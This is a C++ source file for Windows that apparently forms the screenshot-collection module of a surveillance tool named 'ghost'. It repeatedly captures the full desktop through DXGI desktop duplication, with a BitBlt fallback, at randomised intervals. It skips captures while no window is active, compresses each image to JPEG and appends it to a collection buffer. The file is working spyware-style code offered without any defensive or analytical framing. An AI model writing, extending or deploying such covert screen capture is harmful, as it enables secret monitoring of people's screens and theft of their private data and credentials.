#include "collector.h"
#include "../core/ghost_core.h"
#include "../core/config.h"
#include <dxgi1_2.h>
#include <d3d11.h>
#include <wincodec.h>    
#include <vector>
#include <chrono>
#include <random>
#include <thread>
#include <wrl/client.h>   

#pragma comment(lib, "dxgi.lib")
#pragma comment(lib, "d3d11.lib")
#pragma comment(lib, "windowscodecs.lib")
#pragma comment(lib, "ole32.lib") 

using Microsoft::WRL::ComPtr;

namespace ghost {
namespace collector {
namespace screenshot {

bool TryDXGICapture(std::vector<uint8_t>& output, uint32_t& width, uint32_t& height);
bool FallbackBitBltCapture(std::vector<uint8_t>& output, uint32_t& width, uint32_t& height);
bool CompressToJPEG(const std::vector<uint8_t>& rgba, uint32_t width, uint32_t height, std::vector<uint8_t>& compressed);

static ComPtr<ID3D11Device>           g_pDevice;
static ComPtr<ID3D11DeviceContext>    g_pContext;
static ComPtr<IDXGIOutputDuplication> g_pDeskDupl;
static bool                           g_DXGIFailed = false;
static std::chrono::steady_clock::time_point g_LastCaptureTime;

static bool InitializeDXGI() {
    if (g_pDevice) return true;

    HRESULT hr;
    D3D_FEATURE_LEVEL featureLevel;

    hr = D3D11CreateDevice(nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr, 0, nullptr, 0,
                           D3D11_SDK_VERSION, &g_pDevice, &featureLevel, &g_pContext);
    if (FAILED(hr)) { g_DXGIFailed = true; return false; }

    ComPtr<IDXGIDevice> pDxgiDevice;
    hr = g_pDevice.As(&pDxgiDevice);
    if (FAILED(hr)) { g_DXGIFailed = true; return false; }

    ComPtr<IDXGIAdapter> pAdapter;
    hr = pDxgiDevice->GetAdapter(&pAdapter);
    if (FAILED(hr)) { g_DXGIFailed = true; return false; }

    ComPtr<IDXGIOutput> pOutput;
    hr = pAdapter->EnumOutputs(0, &pOutput);
    if (FAILED(hr)) { g_DXGIFailed = true; return false; }

    ComPtr<IDXGIOutput1> pOutput1;
    hr = pOutput.As(&pOutput1);
    if (FAILED(hr)) { g_DXGIFailed = true; return false; }

    hr = pOutput1->DuplicateOutput(g_pDevice.Get(), &g_pDeskDupl);
    if (FAILED(hr)) { g_DXGIFailed = true; return false; }

    return true;
}

void PeriodicCaptureThread() {
    CoInitializeEx(nullptr, COINIT_MULTITHREADED);

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(45, 180);

    while (g_CollectionActive) {
        if (GetForegroundWindow() == nullptr || IsIconic(GetForegroundWindow())) {
            std::this_thread::sleep_for(std::chrono::seconds(30)); 
            continue;
        }

        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - g_LastCaptureTime).count();

        if (elapsed < dis(gen)) {
            std::this_thread::sleep_for(std::chrono::seconds(10)); 
            continue;
        }

        std::vector<uint8_t> captureData;
        uint32_t width = 0, height = 0;
        bool success = false;

        if (!g_DXGIFailed) {
            success = TryDXGICapture(captureData, width, height);
        }

        if (!success) {
            success = FallbackBitBltCapture(captureData, width, height);
        }

        if (success && !captureData.empty() && width > 0 && height > 0) {
            std::vector<uint8_t> compressed;
            if (CompressToJPEG(captureData, width, height, compressed)) {
                AppendToBuffer(compressed.data(), compressed.size());
            }
        }

        g_LastCaptureTime = now;
        std::this_thread::sleep_for(std::chrono::seconds(dis(gen))); 
    }

    CoUninitialize();
}

bool TryDXGICapture(std::vector<uint8_t>& output, uint32_t& width, uint32_t& height) {
    if (!InitializeDXGI() || !g_pDeskDupl) return false;

    HRESULT hr;
    DXGI_OUTDUPL_FRAME_INFO frameInfo;
    ComPtr<IDXGIResource> pDesktopResource;

    hr = g_pDeskDupl->AcquireNextFrame(0, &frameInfo, &pDesktopResource);
    if (FAILED(hr)) {
        if (hr != DXGI_ERROR_WAIT_TIMEOUT) g_DXGIFailed = true;
        return false;
    }

    ComPtr<ID3D11Texture2D> pAcquiredDesktopImage;
    hr = pDesktopResource.As(&pAcquiredDesktopImage);
    if (FAILED(hr)) {
        g_pDeskDupl->ReleaseFrame();
        return false;
    }

    D3D11_TEXTURE2D_DESC desc;
    pAcquiredDesktopImage->GetDesc(&desc);
    
    width = desc.Width;
    height = desc.Height;

    desc.CPUAccessFlags = D3D11_CPU_ACCESS_READ;
    desc.Usage = D3D11_USAGE_STAGING;
    desc.BindFlags = 0;
    desc.MiscFlags = 0;

    ComPtr<ID3D11Texture2D> pStagingTex;
    hr = g_pDevice->CreateTexture2D(&desc, nullptr, &pStagingTex);
    if (FAILED(hr)) {
        g_pDeskDupl->ReleaseFrame();
        return false;
    }

    g_pContext->CopyResource(pStagingTex.Get(), pAcquiredDesktopImage.Get());

    D3D11_MAPPED_SUBRESOURCE mapped;
    hr = g_pContext->Map(pStagingTex.Get(), 0, D3D11_MAP_READ, 0, &mapped);
    if (FAILED(hr)) {
        g_pDeskDupl->ReleaseFrame();
        return false;
    }

    uint32_t pitch = mapped.RowPitch;
    size_t dataSize = pitch * height;
    output.resize(dataSize);

    uint8_t* pDest = output.data();
    uint8_t* pSrc = static_cast<uint8_t*>(mapped.pData);

    for (uint32_t y = 0; y < height; ++y) {
        std::memcpy(pDest + y * width * 4, pSrc + y * pitch, width * 4);
    }

    g_pContext->Unmap(pStagingTex.Get(), 0);
    g_pDeskDupl->ReleaseFrame(); 

    return true;
}

bool FallbackBitBltCapture(std::vector<uint8_t>& output, uint32_t& w, uint32_t& h) {
    HWND hDesktop = GetDesktopWindow();
    HDC hdcScreen = GetDC(hDesktop);
    if (!hdcScreen) return false;

    RECT rc;
    GetClientRect(hDesktop, &rc);
    w = rc.right - rc.left;
    h = rc.bottom - rc.top;

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, w, h);
    SelectObject(hdcMem, hbm);

    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -(int)h; 
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    output.resize(w * h * 4);
    GetDIBits(hdcMem, hbm, 0, h, output.data(), &bmi, DIB_RGB_COLORS);

    DeleteObject(hbm);
    DeleteDC(hdcMem);
    ReleaseDC(hDesktop, hdcScreen);

    return true;
}

bool CompressToJPEG(const std::vector<uint8_t>& bgra, uint32_t width, uint32_t height, std::vector<uint8_t>& compressed) {
    ComPtr<IWICImagingFactory> pFactory;
    HRESULT hr = CoCreateInstance(CLSID_WICImagingFactory, nullptr, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pFactory));
    if (FAILED(hr)) return false;

    ComPtr<IStream> pStream;
    CreateStreamOnHGlobal(NULL, TRUE, &pStream);

    ComPtr<IWICBitmapEncoder> pEncoder;
    hr = pFactory->CreateEncoder(GUID_ContainerFormatJpeg, NULL, &pEncoder);
    if (FAILED(hr)) return false;

    pEncoder->Initialize(pStream.Get(), WICBitmapEncoderNoCache);

    ComPtr<IWICBitmapFrameEncode> pFrame;
    pEncoder->CreateNewFrame(&pFrame, NULL);
    pFrame->Initialize(NULL);
    pFrame->SetSize(width, height);
    
    WICPixelFormatGUID format = GUID_WICPixelFormat32bppBGRA;
    pFrame->SetPixelFormat(&format);

    pFrame->WritePixels(height, width * 4, (UINT)bgra.size(), (BYTE*)bgra.data());
    pFrame->Commit();
    pEncoder->Commit();

    STATSTG stat;
    pStream->Stat(&stat, STATFLAG_NONAME);
    compressed.resize(stat.cbSize.QuadPart);

    LARGE_INTEGER liZero = {};
    pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
    
    ULONG bytesRead;
    pStream->Read(compressed.data(), (ULONG)compressed.size(), &bytesRead);

    return bytesRead > 0;
}

} 
} 
}